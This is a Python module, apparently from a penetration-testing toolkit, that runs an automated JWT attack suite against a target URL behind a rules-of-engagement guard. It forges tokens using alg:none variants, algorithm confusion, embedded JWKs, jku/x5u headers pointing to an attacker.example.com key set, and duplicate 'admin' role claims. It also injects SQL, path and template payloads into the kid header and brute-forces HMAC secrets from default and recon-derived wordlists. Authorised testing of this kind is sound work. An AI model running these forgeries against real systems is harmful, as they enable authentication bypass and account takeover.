import base64
import hashlib
import hmac
import json
import re

import httpx

from .config import load_engine
from .roe_guard import ROEGuard, ROEViolation
from . import http as _http

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]*")

NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "noNe", "nONE"]

KID_SQLI_PAYLOADS = [
    "1' UNION SELECT 'attackersecret' --",
    "1' UNION SELECT 'attackersecret' #",
    "key' UNION SELECT 'attackersecret' --",
    "1' OR '1'='1",
]

KID_PATH_PAYLOADS = [
    "../../../dev/null",
    "/dev/null",
    "../../../../etc/passwd",
    "{{7*7}}",
    "${7*7}",
    "{{config}}",
    "${config}",
    "{{''.__class__}}",
    "{{7*'7'}}",
    "#{7*7}",
    "<%= 7*7 %>",
]

JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/jwks.json",
    "/oauth/jwks",
    "/api/jwks",
]

OIDC_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

HASH_FUNCS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

DEFAULT_SECRETS = [
    "secret", "password", "123456", "changeme", "admin", "test",
    "jwt", "jwtsecret", "jwt_secret", "supersecret", "key",
    "token", "s3cr3t", "your-256-bit-secret",
]


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(seg):
    if isinstance(seg, str):
        seg = seg.encode("ascii")
    pad = b"=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def decode_jwt(token):
    if not token:
        return None
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None
    return {"header": header, "payload": payload, "signature": parts[2],
            "raw_header": parts[0], "raw_payload": parts[1]}


def collect_jwts(steps):
    found = []
    seen = set()
    for s in steps:
        haystack = s.get("body") or ""
        for k, v in (s.get("headers") or {}).items():
            if k.lower() in ("authorization", "set-cookie", "x-auth-token"):
                haystack += " " + str(v)
        for tok in JWT_RE.findall(haystack):
            if tok not in seen:
                seen.add(tok)
                found.append((tok, s.get("step_name")))
    return found


def build_jwt(header, payload, secret="", alg=None):
    a = alg or header.get("alg", "HS256")
    h = dict(header)
    h["alg"] = a
    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")))
    if str(a).lower() == "none":
        return f"{h_b64}.{p_b64}."
    hfunc = HASH_FUNCS.get(a)
    if hfunc is None:
        return None
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    sig = hmac.new(secret, signing_input, hfunc).digest()
    return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"


def forge_none_variants(token, claims=None):
    decoded = decode_jwt(token)
    if not decoded:
        return []
    variants = []
    for variant in NONE_VARIANTS:
        h = dict(decoded["header"])
        h["alg"] = variant
        h.pop("kid", None)
        p = dict(decoded["payload"])
        if claims:
            p.update(claims)
        h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
        p_b64 = b64url_encode(json.dumps(p, separators=(",", ":")))
        variants.append(f"{h_b64}.{p_b64}.")
    return variants


def forge_algorithm_confusion(token, public_key, claims=None):
    from .auth_t2 import jwt_pubkey_confusion
    # Delegate to T2 module for JWKS-based confusion if public_key is a URL
    if isinstance(public_key, str) and public_key.startswith("http"):
        return jwt_pubkey_confusion.scan(public_key, "", token)
    decoded = decode_jwt(token)
    if not decoded:
        return []
    h = dict(decoded["header"])
    h["alg"] = "HS256"
    h.pop("kid", None)
    h.pop("jwk", None)
    p = dict(decoded["payload"])
    if claims:
        p.update(claims)
    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
    p_b64 = b64url_encode(json.dumps(p, separators=(",", ":")))
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    if isinstance(public_key, str):
        public_key = public_key.encode("utf-8")
    sig = hmac.new(public_key, signing_input, hashlib.sha256).digest()
    return [f"{h_b64}.{p_b64}.{b64url_encode(sig)}"]


def forge_kid_injection(token, kid_value, secret, claims=None):
    decoded = decode_jwt(token)
    if not decoded:
        return None
    h = dict(decoded["header"])
    h["alg"] = "HS256"
    h["kid"] = kid_value
    p = dict(decoded["payload"])
    if claims:
        p.update(claims)
    return build_jwt(h, p, secret=secret, alg="HS256")


def forge_embedded_jwk(token, claims=None):
    if not HAS_CRYPTO:
        return None
    decoded = decode_jwt(token)
    if not decoded:
        return None
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = private_key.public_key().public_numbers()
    n_bytes = pub.n.to_bytes((pub.n.bit_length() + 7) // 8, "big")
    e_bytes = pub.e.to_bytes((pub.e.bit_length() + 7) // 8, "big")
    jwk = {"kty": "RSA", "kid": "sec-checker-injected", "use": "sig",
           "alg": "RS256", "n": b64url_encode(n_bytes),
           "e": b64url_encode(e_bytes)}
    h = dict(decoded["header"])
    h["alg"] = "RS256"
    h["jwk"] = jwk
    h.pop("kid", None)
    p = dict(decoded["payload"])
    if claims:
        p.update(claims)
    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
    p_b64 = b64url_encode(json.dumps(p, separators=(",", ":")))
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"


def forge_jku_x5u(token, header_name, attacker_url, claims=None):
    decoded = decode_jwt(token)
    if not decoded:
        return None
    h = dict(decoded["header"])
    h[header_name] = attacker_url
    h["alg"] = h.get("alg", "RS256")
    p = dict(decoded["payload"])
    if claims:
        p.update(claims)
    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
    p_b64 = b64url_encode(json.dumps(p, separators=(",", ":")))
    return "%s.%s." % (h_b64, p_b64)


def forge_iss_aud_tamper(token, claim, new_value, claims=None):
    decoded = decode_jwt(token)
    if not decoded:
        return None
    h = dict(decoded["header"])
    h["alg"] = "none"
    p = dict(decoded["payload"])
    p[claim] = new_value
    if claims:
        p.update(claims)
    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
    p_b64 = b64url_encode(json.dumps(p, separators=(",", ":")))
    return "%s.%s." % (h_b64, p_b64)


def forge_duplicate_claim(token, claim, value1, value2, secret=None):
    decoded = decode_jwt(token)
    if not decoded:
        return None
    h = dict(decoded["header"])
    alg = h.get("alg", "HS256")
    p = dict(decoded["payload"])
    h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")))
    pairs = []
    for k, v in p.items():
        if k == claim:
            pairs.append(json.dumps(k) + ":" + json.dumps(value1))
            pairs.append(json.dumps(k) + ":" + json.dumps(value2))
        else:
            pairs.append(json.dumps(k) + ":"
                         + json.dumps(v, separators=(",", ":")))
    p_raw = "{" + ",".join(pairs) + "}"
    p_b64 = b64url_encode(p_raw)
    if str(alg).lower() == "none" or not secret:
        return "%s.%s." % (h_b64, p_b64)
    hfunc = HASH_FUNCS.get(alg)
    if hfunc is None:
        return "%s.%s." % (h_b64, p_b64)
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    signing_input = ("%s.%s" % (h_b64, p_b64)).encode("ascii")
    sig = hmac.new(secret, signing_input, hfunc).digest()
    return "%s.%s.%s" % (h_b64, p_b64, b64url_encode(sig))


def derive_secrets_from_recon(target_url, roe_guard=None, verify=None,
                                limit=30, skip_network=False):
    from urllib.parse import urlparse
    out = []
    parsed = urlparse(target_url)
    host = parsed.hostname or ""
    base = ""
    if host:
        parts = host.split(".")
        base = parts[-2] if len(parts) >= 2 else parts[0]
        out.extend([base, host])
    if not skip_network:
        try:
            from .recon import ct_logs
            ct = ct_logs.harvest(host) if host else None
            if ct:
                for sub in (ct.get("subdomains") or [])[:10]:
                    out.append(sub.split(".")[0])
        except Exception:
            pass
        try:
            from .recon import wayback
            wb = wayback.harvest(host) if host else None
            if wb:
                for p in (wb.get("paths") or [])[:10]:
                    for seg in p.strip("/").split("/"):
                        if seg and len(seg) >= 4 and seg.isalpha():
                            out.append(seg)
        except Exception:
            pass
    seen = set()
    deduped = []
    for s in out:
        s = str(s).strip()
        if not s or s in seen or len(s) > 100:
            continue
        seen.add(s)
        deduped.append(s)
    return deduped[:limit]


def crack_hmac(token, secrets=None):
    decoded = decode_jwt(token)
    if not decoded:
        return None
    alg = str(decoded["header"].get("alg", "")).upper()
    hfunc = HASH_FUNCS.get(alg)
    if hfunc is None:
        return {"crackable": False, "alg": alg}
    signing_input = (decoded["raw_header"] + "." + decoded["raw_payload"]).encode("ascii")
    try:
        want = b64url_decode(decoded["signature"])
    except Exception:
        return {"crackable": True, "alg": alg, "secret": None}
    for secret in (secrets or DEFAULT_SECRETS):
        computed = hmac.new(secret.encode("utf-8"), signing_input, hfunc).digest()
        if hmac.compare_digest(computed, want):
            return {"crackable": True, "alg": alg, "secret": secret}
    return {"crackable": True, "alg": alg, "secret": None}


def fetch_jwks(base_url, timeout=10, roe_guard=None, verify=None):
    if verify is None:
        verify = _verify_tls()
    base = base_url.rstrip("/")
    for path in JWKS_PATHS:
        url = base + path
        if _roe_block(roe_guard, url, "GET"):
            continue
        try:
            with _http.Client(timeout=timeout, verify=verify,
                              follow_redirects=True) as c:
                r = c.get(url)
            if r.status_code == 200:
                data = r.json()
                if "keys" in data:
                    return {"url": url, "jwks": data}
        except Exception:
            continue
    for path in OIDC_PATHS:
        url = base + path
        if _roe_block(roe_guard, url, "GET"):
            continue
        try:
            with _http.Client(timeout=timeout, verify=verify,
                              follow_redirects=True) as c:
                r = c.get(url)
            if r.status_code == 200:
                data = r.json()
                jwks_uri = data.get("jwks_uri")
                if jwks_uri and not _roe_block(roe_guard, jwks_uri, "GET"):
                    with _http.Client(timeout=timeout, verify=verify,
                                      follow_redirects=True) as c:
                        r2 = c.get(jwks_uri)
                    if r2.status_code == 200 and "keys" in (r2.json() or {}):
                        return {"url": jwks_uri, "jwks": r2.json()}
        except Exception:
            continue
    return None


def jwk_to_pem(jwk):
    if not HAS_CRYPTO:
        return None
    try:
        if jwk.get("kty") == "RSA":
            n = int.from_bytes(b64url_decode(jwk["n"]), "big")
            e = int.from_bytes(b64url_decode(jwk["e"]), "big")
            pub = rsa.RSAPublicNumbers(e, n).public_key()
            return pub.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            ).decode("ascii")
    except Exception:
        return None
    return None


def _request(url, method, token, headers, timeout, roe_guard=None, verify=None):
    if verify is None:
        verify = _verify_tls()
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"status": None, "error": f"ROE_BLOCK: {viol}", "blocked": True}
    h = dict(headers or {})
    h["Authorization"] = f"Bearer {token}"
    try:
        with _http.Client(timeout=timeout, verify=verify, follow_redirects=False) as c:
            r = c.request(method.upper(), url, headers=h)
        return {"status": r.status_code, "body": (r.text or "")[:2000],
                "headers": dict(r.headers)}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _fingerprint(resp):
    if not resp or resp.get("status") is None:
        return None
    body = resp.get("body") or ""
    status = resp["status"]
    length_bucket = len(body) // 50
    h = hashlib.sha256(body.encode("utf-8", "ignore")).hexdigest()[:12]
    return (status, length_bucket, h)


def _body_similar(a, b, tolerance=100):
    if not a or not b:
        return False
    if a.get("status") != b.get("status"):
        return False
    ab = a.get("body") or ""
    bb = b.get("body") or ""
    return abs(len(ab) - len(bb)) <= tolerance


def _classify(vector, forged, baseline, invalid):
    if not forged or forged.get("status") is None:
        return {"vector": vector, "verdict": "UNKNOWN",
                "reason": f"request failed: {(forged or {}).get('error', '')[:120]}"}

    f_status = forged["status"]
    b_status = (baseline or {}).get("status")

    if b_status is None:
        return {"vector": vector, "verdict": "UNKNOWN",
                "reason": "baseline (valid token) response unavailable"}

    if b_status not in (200, 201, 202):
        return {"vector": vector, "verdict": "UNKNOWN",
                "reason": f"valid baseline returned HTTP {b_status}; cannot test token acceptance"}

    f_fp = _fingerprint(forged)
    i_fp = _fingerprint(invalid)
    b_fp = _fingerprint(baseline)

    if i_fp is None:
        return {"vector": vector, "verdict": "UNKNOWN",
                "reason": "invalid-token response unavailable for comparison"}

    if (invalid or {}).get("status") == b_status and _body_similar(invalid, baseline):
        return {"vector": vector, "verdict": "UNKNOWN",
                "reason": (f"endpoint returns the same response (HTTP {b_status}) to a valid "
                           f"token and an invalid token; it does not enforce JWT auth here, "
                           f"so token forgery cannot be tested")}

    _f_body = (forged or {}).get("body") or ""
    _b_body = (baseline or {}).get("body") or ""
    _i_body = (invalid or {}).get("body") or ""
    if _f_body and _b_body and _f_body == _b_body:
        return {"vector": vector, "verdict": "VULNERABLE",
                "reason": f"forged token body identical to valid-token baseline (HTTP {f_status})",
                "status": f_status}
    if _f_body and _i_body and _f_body == _i_body:
        return {"vector": vector, "verdict": "PASS",
                "reason": f"forged token body identical to invalid-token response (HTTP {f_status})",
                "status": f_status}

    if f_fp == i_fp or _body_similar(forged, invalid):
        return {"vector": vector, "verdict": "PASS",
                "reason": f"forged token produced the invalid-token response (HTTP {f_status})"}

    if f_fp == b_fp or _body_similar(forged, baseline):
        return {"vector": vector, "verdict": "VULNERABLE",
                "reason": f"forged token accepted (HTTP {f_status}, matches valid-token baseline)",
                "status": f_status}

    if f_status in (401, 403):
        return {"vector": vector, "verdict": "PASS",
                "reason": f"forged token rejected (HTTP {f_status})",
                "status": f_status}

    if f_status >= 500:
        return {"vector": vector, "verdict": "UNKNOWN",
                "reason": f"server error (HTTP {f_status})", "status": f_status}

    return {"vector": vector, "verdict": "SUSPICIOUS",
            "reason": f"response (HTTP {f_status}) differs from both valid baseline and invalid token",
            "status": f_status}


def _run_attack_suite_impl(target_url, token, method="GET", headers=None,
                     public_key=None, secrets=None, claim_overrides=None,
                     timeout=15, roe_guard=None, verify=None):
    if verify is None:
        verify = _verify_tls()

    decoded = decode_jwt(token)
    if not decoded:
        return {"error": "invalid JWT format", "results": [], "summary": {}}

    if secrets is None:
        try:
            _rs = derive_secrets_from_recon(target_url,
                                             roe_guard=roe_guard,
                                             verify=verify)
        except Exception:
            _rs = []
        if _rs:
            secrets = _rs

    invalid = _request(target_url, method, "invalid.jwt.token", headers, timeout, roe_guard, verify)
    if invalid.get("blocked"):
        return {"error": invalid["error"], "results": [], "summary": {}}

    baseline = _request(target_url, method, token, headers, timeout, roe_guard, verify)
    if baseline.get("blocked"):
        return {"error": baseline["error"], "results": [], "summary": {}}

    results = []

    for forged in forge_none_variants(token, claim_overrides):
        r = _request(target_url, method, forged, headers, timeout, roe_guard, verify)
        results.append(_classify("alg:none", r, baseline, invalid))

    if public_key:
        for forged in forge_algorithm_confusion(token, public_key, claim_overrides):
            r = _request(target_url, method, forged, headers, timeout, roe_guard, verify)
            results.append(_classify("algorithm-confusion", r, baseline, invalid))

    for payload in KID_SQLI_PAYLOADS:
        forged = forge_kid_injection(token, payload, "attackersecret", claim_overrides)
        if forged:
            r = _request(target_url, method, forged, headers, timeout, roe_guard, verify)
            results.append(_classify(f"kid-sqli[{payload[:30]}]", r, baseline, invalid))

    for payload in KID_PATH_PAYLOADS:
        forged = forge_kid_injection(token, payload, "", claim_overrides)
        if forged:
            r = _request(target_url, method, forged, headers, timeout, roe_guard, verify)
            results.append(_classify(f"kid-path[{payload}]", r, baseline, invalid))

    embedded = forge_embedded_jwk(token, claim_overrides)
    if embedded:
        r = _request(target_url, method, embedded, headers, timeout, roe_guard, verify)
        results.append(_classify("embedded-jwk", r, baseline, invalid))

    for _vec in ("jku", "x5u"):
        _forged = forge_jku_x5u(
            token, _vec, "https://attacker.example.com/jwks.json",
            claim_overrides)
        if _forged:
            r = _request(target_url, method, _forged, headers, timeout, roe_guard, verify)
            results.append(_classify("%s-injection" % _vec, r, baseline, invalid))

    for _claim in ("iss", "aud"):
        if decoded["payload"].get(_claim):
            _forged = forge_iss_aud_tamper(
                token, _claim, "attacker.example.com", claim_overrides)
            if _forged:
                r = _request(target_url, method, _forged, headers, timeout, roe_guard, verify)
                results.append(_classify("%s-tamper" % _claim, r, baseline, invalid))

    for _claim, _v1, _v2 in (
            ("role", "admin", "user"),
            ("role", "user", "admin"),
            ("sub", "1", "9999"),
            ("is_admin", "true", "false")):
        _forged = forge_duplicate_claim(token, _claim, _v1, _v2)
        if _forged:
            r = _request(target_url, method, _forged, headers, timeout, roe_guard, verify)
            results.append(_classify(
                "dup-claim-%s[%s|%s]" % (_claim, _v1, _v2),
                r, baseline, invalid))

    crack = crack_hmac(token, secrets)
    if crack and crack.get("secret"):
        p = dict(decoded["payload"])
        if claim_overrides:
            p.update(claim_overrides)
        forged = build_jwt(decoded["header"], p, crack["secret"],
                           decoded["header"].get("alg", "HS256"))
        if forged:
            r = _request(target_url, method, forged, headers, timeout, roe_guard, verify)
            entry = _classify("weak-secret", r, baseline, invalid)
            entry["secret"] = crack["secret"]
            results.append(entry)

    counts = {"VULNERABLE": 0, "SUSPICIOUS": 0, "PASS": 0, "UNKNOWN": 0}
    for r in results:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
    return {"decoded": decoded, "baseline": baseline, "invalid": invalid,
            "results": results, "summary": counts}

def run_attack_suite(*args, **kwargs):
    from .contract import make_result
    raw = _run_attack_suite_impl(*args, **kwargs)
    return make_result(raw, capability="jwt_attacks", args=args, kwargs=kwargs)
